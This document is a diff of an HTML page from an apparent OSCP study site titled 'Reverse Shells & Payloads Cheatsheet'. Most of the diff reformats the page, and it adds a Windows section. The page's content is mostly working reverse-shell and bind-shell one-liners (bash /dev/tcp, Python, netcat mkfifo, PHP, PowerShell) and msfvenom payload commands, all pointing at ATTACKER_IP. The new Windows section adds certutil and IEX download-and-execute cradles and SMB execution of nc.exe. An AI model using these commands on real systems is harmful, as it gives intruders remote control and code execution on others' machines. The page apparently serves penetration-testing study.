@@ -118,7 +118,7 @@
         <a href="qol.html">QOL</a>
 
     </nav>
-     <div class="search-bar">
+    <div class="search-bar">
         <input type="text" id="global-search" placeholder="Buscar..." />
         <button onclick="performSearch()">🔍 Search</button>
         <button id="toggle-results" onclick="toggleSearchResults()">▲</button>
@@ -128,288 +128,364 @@
 
     <div class="container">
 
-    <h1>Reverse Shells & Payloads Cheatsheet (OSCP Style)</h1>
+        <h1>Reverse Shells & Payloads Cheatsheet (OSCP Style)</h1>
 
-    <!-- 1 -->
-    <div class="section">
-        <div class="section-header">1. Bash Reverse Shell</div>
-        <div class="section-content">
+        <!-- 1 -->
+        <div class="section">
+            <div class="section-header">1. Bash Reverse Shell</div>
+            <div class="section-content">
 
-<pre><code>bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1</code></pre>
+                <pre><code>bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1</code></pre>
 
-            <p><strong>Alternative:</strong></p>
+                <p><strong>Alternative:</strong></p>
 
-<pre><code>bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'</code></pre>
+                <pre><code>bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'</code></pre>
 
+            </div>
         </div>
-    </div>
 
-    <!-- 2 -->
-    <div class="section">
-        <div class="section-header">2. Python Reverse Shell</div>
-        <div class="section-content">
+        <!-- 2 -->
+        <div class="section">
+            <div class="section-header">2. Python Reverse Shell</div>
+            <div class="section-content">
 
-<pre><code>python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'</code></pre>
+                <pre><code>python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'</code></pre>
 
-            <p><strong>Python2:</strong></p>
+                <p><strong>Python2:</strong></p>
 
-<pre><code>python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'</code></pre>
+                <pre><code>python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'</code></pre>
 
+            </div>
         </div>
-    </div>
 
-    <!-- 3 -->
-    <div class="section">
-        <div class="section-header">3. Netcat Reverse Shell</div>
-        <div class="section-content">
+        <!-- 3 -->
+        <div class="section">
+            <div class="section-header">3. Netcat Reverse Shell</div>
+            <div class="section-content">
 
-<pre><code>nc -e /bin/sh ATTACKER_IP PORT</code></pre>
+                <pre><code>nc -e /bin/sh ATTACKER_IP PORT</code></pre>
 
-            <p><strong>If -e is not available:</strong></p>
+                <p><strong>If -e is not available:</strong></p>
 
-<pre><code>rm /tmp/f; mkfifo /tmp/f
+                <pre><code>rm /tmp/f; mkfifo /tmp/f
 cat /tmp/f | /bin/sh -i 2>&1 | nc ATTACKER_IP PORT > /tmp/f</code></pre>
 
+            </div>
         </div>
-    </div>
 
-    <!-- 4 -->
-    <div class="section">
-        <div class="section-header">4. PHP Reverse Shell</div>
-        <div class="section-content">
+        <!-- 4 -->
+        <div class="section">
+            <div class="section-header">4. PHP Reverse Shell</div>
+            <div class="section-content">
 
-<pre><code>php -r '$sock=fsockopen("ATTACKER_IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'</code></pre>
+                <pre><code>php -r '$sock=fsockopen("ATTACKER_IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'</code></pre>
 
+            </div>
         </div>
-    </div>
 
-    <!-- 5 -->
-    <div class="section">
-        <div class="section-header">5. PowerShell Reverse Shell</div>
-        <div class="section-content">
+        <!-- 5 -->
+        <div class="section">
+            <div class="section-header">5. PowerShell Reverse Shell</div>
+            <div class="section-content">
 
-<pre><code>powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("ATTACKER_IP",PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}</code></pre>
+                <pre><code>powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("ATTACKER_IP",PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}</code></pre>
 
+            </div>
         </div>
-    </div>
 
-    <!-- 6 -->
-    <div class="section">
-        <div class="section-header">6. Bind Shell</div>
-        <div class="section-content">
+        <!-- 6 -->
+        <div class="section">
+            <div class="section-header">6. Bind Shell</div>
+            <div class="section-content">
 
-<pre><code>nc -lvnp PORT -e /bin/sh</code></pre>
+                <pre><code>nc -lvnp PORT -e /bin/sh</code></pre>
 
-            <p><strong>Connect to it:</strong></p>
+                <p><strong>Connect to it:</strong></p>
 
-<pre><code>nc target_ip PORT</code></pre>
+                <pre><code>nc target_ip PORT</code></pre>
 
-            <p><strong>Note:</strong> Less common in OSCP but useful in restricted environments.</p>
+                <p><strong>Note:</strong> Less common in OSCP but useful in restricted environments.</p>
 
+            </div>
         </div>
-    </div>
 
-    <!-- 7 -->
-    <div class="section">
-        <div class="section-header">7. Listener (Always First)</div>
-        <div class="section-content">
+        <!-- 7 -->
+        <div class="section">
+            <div class="section-header">7. Listener (Always First)</div>
+            <div class="section-content">
 
-<pre><code>nc -lvnp PORT</code></pre>
+                <pre><code>nc -lvnp PORT</code></pre>
 
-            <p><strong>Important:</strong> Start listener BEFORE executing payload.</p>
+                <p><strong>Important:</strong> Start listener BEFORE executing payload.</p>
 
+            </div>
         </div>
-    </div>
 
-    <!-- 8 -->
-    <div class="section">
-        <div class="section-header">8. TTY Upgrade (Stabilize Shell)</div>
-        <div class="section-content">
+        <!-- 8 -->
+        <div class="section">
+            <div class="section-header">8. TTY Upgrade (Stabilize Shell)</div>
+            <div class="section-content">
 
-<pre><code>python3 -c 'import pty; pty.spawn("/bin/bash")'</code></pre>
+                <pre><code>python3 -c 'import pty; pty.spawn("/bin/bash")'</code></pre>
 
-<pre><code>export TERM=xterm</code></pre>
+                <pre><code>export TERM=xterm</code></pre>
 
-<pre><code>Ctrl + Z
+                <pre><code>Ctrl + Z
 stty raw -echo
 fg
 </code></pre>
 
-<pre><code>stty rows 40 cols 100</code></pre>
+                <pre><code>stty rows 40 cols 100</code></pre>
 
-            <p><strong>Result:</strong> Fully interactive shell</p>
+                <p><strong>Result:</strong> Fully interactive shell</p>
 
+            </div>
         </div>
-    </div>
 
-    <!-- 9 -->
-    <div class="section">
-        <div class="section-header">9. msfvenom Cheatsheet</div>
-        <div class="section-content">
+        <!-- 9 -->
+        <div class="section">
+            <div class="section-header">9. msfvenom Cheatsheet</div>
+            <div class="section-content">
 
-            <p><strong>Linux ELF:</strong></p>
+                <p><strong>Linux ELF:</strong></p>
 
-<pre><code>msfvenom -p linux/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f elf > shell.elf</code></pre>
+                <pre><code>msfvenom -p linux/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f elf > shell.elf</code></pre>
 
-            <p><strong>Windows EXE:</strong></p>
+                <p><strong>Windows EXE:</strong></p>
 
-<pre><code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f exe > shell.exe</code></pre>
+                <pre><code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f exe > shell.exe</code></pre>
 
-            <p><strong>PHP:</strong></p>
+                <p><strong>PHP:</strong></p>
 
-<pre><code>msfvenom -p php/reverse_php LHOST=ATTACKER_IP LPORT=PORT -f raw > shell.php</code></pre>
+                <pre><code>msfvenom -p php/reverse_php LHOST=ATTACKER_IP LPORT=PORT -f raw > shell.php</code></pre>
 
-            <p><strong>ASP:</strong></p>
+                <p><strong>ASP:</strong></p>
 
-<pre><code>msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f asp > shell.asp</code></pre>
+                <pre><code>msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f asp > shell.asp</code></pre>
 
-            <p><strong>JSP:</strong></p>
+                <p><strong>JSP:</strong></p>
 
-<pre><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f raw > shell.jsp</code></pre>
+                <pre><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f raw > shell.jsp</code></pre>
 
+            </div>
         </div>
-    </div>
 
-    <!-- 10 -->
-    <div class="section">
-        <div class="section-header">10. OSCP Mental Flow</div>
-        <div class="section-content">
+        <!-- 10 -->
+        <div class="section">
+            <div class="section-header">10. OSCP Mental Flow</div>
+            <div class="section-content">
 
-            <ol>
-                <li>Start listener</li>
-                <li>Choose payload based on target</li>
-                <li>Execute payload</li>
-                <li>Catch shell</li>
-                <li>Upgrade TTY</li>
-            </ol>
+                <ol>
+                    <li>Start listener</li>
+                    <li>Choose payload based on target</li>
+                    <li>Execute payload</li>
+                    <li>Catch shell</li>
+                    <li>Upgrade TTY</li>
+                </ol>
 
+            </div>
         </div>
+
+        <!-- 11 -->
+<div class="section">
+    <div class="section-header">11. Windows Reverse Shell (nc.exe + PowerShell.ps1 Workflow)</div>
+    <div class="section-content">
+
+        <h3>1. Host Files on Attacker Machine</h3>
+
+        <pre><code>python3 -m http.server 80</code></pre>
+
+        <p><strong>Place in the same directory:</strong></p>
+        <ul>
+            <li>nc.exe (optional binary method)</li>
+            <li>shell.ps1 (fileless PowerShell reverse shell)</li>
+        </ul>
+
+
+        <h3>2. Download nc.exe (Binary Method)</h3>
+
+        <pre><code>certutil -urlcache -f http://ATTACKER_IP/nc.exe nc.exe</code></pre>
+
+        <p><strong>Alternative:</strong></p>
+
+        <pre><code>powershell -c "Invoke-WebRequest -Uri http://ATTACKER_IP/nc.exe -OutFile nc.exe"</code></pre>
+
+
+        <h3>3. Execute nc.exe Reverse Shell</h3>
+
+        <pre><code>nc.exe ATTACKER_IP PORT -e cmd.exe</code></pre>
+
+        <p><strong>Listener (attacker):</strong></p>
+        <pre><code>nc -lvnp PORT</code></pre>
+
+
+        <h3>4. Fileless PowerShell Reverse Shell (shell.ps1)</h3>
+
+        <p><strong>Execute directly in memory (no disk write):</strong></p>
+
+        <pre><code>powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/shell.ps1')"</code></pre>
+
+        <p><strong>Alternative download cradle:</strong></p>
+
+        <pre><code>powershell -c "IEX(Invoke-WebRequest http://ATTACKER_IP/shell.ps1 -UseBasicParsing).Content"</code></pre>
+
+
+        <h3>5. PowerShell Inline Download + Execute nc.exe</h3>
+
+        <pre><code>powershell -c "Invoke-WebRequest http://ATTACKER_IP/nc.exe -OutFile C:\Windows\Temp\nc.exe; C:\Windows\Temp\nc.exe ATTACKER_IP PORT -e cmd.exe"</code></pre>
+
+
+        <h3>6. SMB Execution (Optional Alternative)</h3>
+
+        <p><strong>Attacker (SMB share):</strong></p>
+        <pre><code>impacket-smbserver share . -smb2support</code></pre>
+
+        <p><strong>Target:</strong></p>
+        <pre><code>\\ATTACKER_IP\share\nc.exe ATTACKER_IP PORT -e cmd.exe</code></pre>
+
+
+        <h3>7. Listener (Always Required)</h3>
+
+        <pre><code>nc -lvnp PORT</code></pre>
+
+
+        <h3>8. OSCP Execution Flow</h3>
+
+        <ol>
+            <li>Start listener</li>
+            <li>Check if PowerShell is available</li>
+            <li>If yes → use shell.ps1 (fileless)</li>
+            <li>If blocked → use nc.exe (download + execute)</li>
+            <li>Fallback → SMB execution or mixed method</li>
+        </ol>
+
     </div>
-
-    <!-- CHECKLIST -->
-    <div class="section">
-        <div class="section-header">Shell Checklist</div>
-        <div class="section-content">
-
-            <form class="checklist">
-
-                <h3>Before Exploit</h3>
-                <label><input type="checkbox"> Started listener</label><br>
-                <label><input type="checkbox"> Selected correct payload</label><br>
-
-                <h3>After Shell</h3>
-                <label><input type="checkbox"> Upgraded TTY</label><br>
-                <label><input type="checkbox"> Checked user (whoami)</label><br>
-                <label><input type="checkbox"> Checked environment</label><br>
-
-                <h3>Stability</h3>
-                <label><input type="checkbox"> Fixed terminal</label><br>
-                <label><input type="checkbox"> Adjusted rows/cols</label><br>
-
-            </form>
-
-        </div>
-    </div>
-
 </div>
+
+        <!-- CHECKLIST -->
+        <div class="section">
+            <div class="section-header">Shell Checklist</div>
+            <div class="section-content">
+
+                <form class="checklist">
+
+                    <h3>Before Exploit</h3>
+                    <label><input type="checkbox"> Started listener</label><br>
+                    <label><input type="checkbox"> Selected correct payload</label><br>
+
+                    <h3>After Shell</h3>
+                    <label><input type="checkbox"> Upgraded TTY</label><br>
+                    <label><input type="checkbox"> Checked user (whoami)</label><br>
+                    <label><input type="checkbox"> Checked environment</label><br>
+
+                    <h3>Stability</h3>
+                    <label><input type="checkbox"> Fixed terminal</label><br>
+                    <label><input type="checkbox"> Adjusted rows/cols</label><br>
+
+                </form>
+
+            </div>
+        </div>
+
+    </div>
     <!-- SCRIPT -->
     <script>
-                document.querySelectorAll(".section-header").forEach(h => {
-                        h.addEventListener("click", () => h.parentElement.classList.toggle("active"))
+        document.querySelectorAll(".section-header").forEach(h => {
+            h.addEventListener("click", () => h.parentElement.classList.toggle("active"))
+        });
+        function toggleSearchResults() {
+            const results = document.getElementById("search-results");
+            const toggleBtn = document.getElementById("toggle-results");
+
+            results.classList.toggle("collapsed");
+
+            if (results.classList.contains("collapsed")) {
+                toggleBtn.textContent = "▼";
+            } else {
+                toggleBtn.textContent = "▲";
+            }
+        }
+
+        function performSearch() {
+            const query = document.getElementById("global-search").value.toLowerCase();
+            const resultsContainer = document.getElementById("search-results");
+            resultsContainer.innerHTML = "";
+
+            if (!query) {
+                resultsContainer.classList.add("collapsed");
+                return;
+            }
+
+            const allElements = Array.from(document.body.querySelectorAll("*"))
+                .filter(el => el.children.length === 0 && el.textContent.toLowerCase().includes(query));
+
+            if (allElements.length === 0) {
+                resultsContainer.innerHTML = "<div>No se encontraron resultados</div>";
+            } else {
+                allElements.forEach((el, idx) => {
+                    let container = el.closest(".section, .sub-section") || el;
+
+                    if (!container.id) {
+                        container.id = `search-target-${idx}`;
+                    }
+
+                    const div = document.createElement("div");
+                    div.textContent = el.textContent;
+                    div.style.cursor = "pointer";
+                    div.style.padding = "5px 10px";
+                    div.style.borderBottom = "1px solid #1e293b";
+                    div.onmouseover = () => div.style.backgroundColor = "#1e293b";
+                    div.onmouseout = () => div.style.backgroundColor = "";
+                    div.onclick = () => {
+                        if (container.classList.contains("section") || container.classList.contains("sub-section")) {
+                            container.classList.add("active");
+                        }
+
+                        container.scrollIntoView({ behavior: "smooth", block: "center" });
+
+                        container.classList.add("highlight-fade");
+                        setTimeout(() => container.classList.remove("highlight-fade"), 2000);
+                    };
+
+                    resultsContainer.appendChild(div);
                 });
-                function toggleSearchResults() {
-                        const results = document.getElementById("search-results");
-                        const toggleBtn = document.getElementById("toggle-results");
+            }
 
-                        results.classList.toggle("collapsed");
+            resultsContainer.classList.remove("collapsed");
+        }
+        document.querySelectorAll(".sub-title").forEach(title => {
+            const wrapper = document.createElement("div");
+            wrapper.classList.add("sub-wrapper");
 
-                        if (results.classList.contains("collapsed")) {
-                                toggleBtn.textContent = "▼";
-                        } else {
-                                toggleBtn.textContent = "▲";
-                        }
-                }
+            const content = document.createElement("div");
+            content.classList.add("sub-content");
 
-                function performSearch() {
-                        const query = document.getElementById("global-search").value.toLowerCase();
-                        const resultsContainer = document.getElementById("search-results");
-                        resultsContainer.innerHTML = "";
+            // meter wrapper en el DOM justo antes del título
+            title.parentNode.insertBefore(wrapper, title);
 
-                        if (!query) {
-                                resultsContainer.classList.add("collapsed");
-                                return;
-                        }
+            // mover el título dentro del wrapper
+            wrapper.appendChild(title);
 
-                        const allElements = Array.from(document.body.querySelectorAll("*"))
-                                .filter(el => el.children.length === 0 && el.textContent.toLowerCase().includes(query));
+            // mover todo hasta el siguiente sub-title o section-header
+            let next = wrapper.nextSibling;
 
-                        if (allElements.length === 0) {
-                                resultsContainer.innerHTML = "<div>No se encontraron resultados</div>";
-                        } else {
-                                allElements.forEach((el, idx) => {
-                                        let container = el.closest(".section, .sub-section") || el;
+            while (
+                next &&
+                !(next.classList && (next.classList.contains("sub-title") || next.classList.contains("section-header")))
+            ) {
+                const temp = next.nextSibling;
+                content.appendChild(next);
+                next = temp;
+            }
 
-                                        if (!container.id) {
-                                                container.id = `search-target-${idx}`;
-                                        }
+            wrapper.appendChild(content);
 
-                                        const div = document.createElement("div");
-                                        div.textContent = el.textContent;
-                                        div.style.cursor = "pointer";
-                                        div.style.padding = "5px 10px";
-                                        div.style.borderBottom = "1px solid #1e293b";
-                                        div.onmouseover = () => div.style.backgroundColor = "#1e293b";
-                                        div.onmouseout = () => div.style.backgroundColor = "";
-                                        div.onclick = () => {
-                                                if (container.classList.contains("section") || container.classList.contains("sub-section")) {
-                                                        container.classList.add("active");
-                                                }
-
-                                                container.scrollIntoView({ behavior: "smooth", block: "center" });
-
-                                                container.classList.add("highlight-fade");
-                                                setTimeout(() => container.classList.remove("highlight-fade"), 2000);
-                                        };
-
-                                        resultsContainer.appendChild(div);
-                                });
-                        }
-
-                        resultsContainer.classList.remove("collapsed");
-                }
-                document.querySelectorAll(".sub-title").forEach(title => {
-                        const wrapper = document.createElement("div");
-                        wrapper.classList.add("sub-wrapper");
-
-                        const content = document.createElement("div");
-                        content.classList.add("sub-content");
-
-                        // meter wrapper en el DOM justo antes del título
-                        title.parentNode.insertBefore(wrapper, title);
-
-                        // mover el título dentro del wrapper
-                        wrapper.appendChild(title);
-
-                        // mover todo hasta el siguiente sub-title o section-header
-                        let next = wrapper.nextSibling;
-
-                        while (
-                                next &&
-                                !(next.classList && (next.classList.contains("sub-title") || next.classList.contains("section-header")))
-                        ) {
-                                const temp = next.nextSibling;
-                                content.appendChild(next);
-                                next = temp;
-                        }
-
-                        wrapper.appendChild(content);
-
-                        // toggle
-                        title.addEventListener("click", () => {
-                                wrapper.classList.toggle("active");
-                        });
-                });
-        </script>
+            // toggle
+            title.addEventListener("click", () => {
+                wrapper.classList.toggle("active");
+            });
+        });
+    </script>
 
 </body>
 
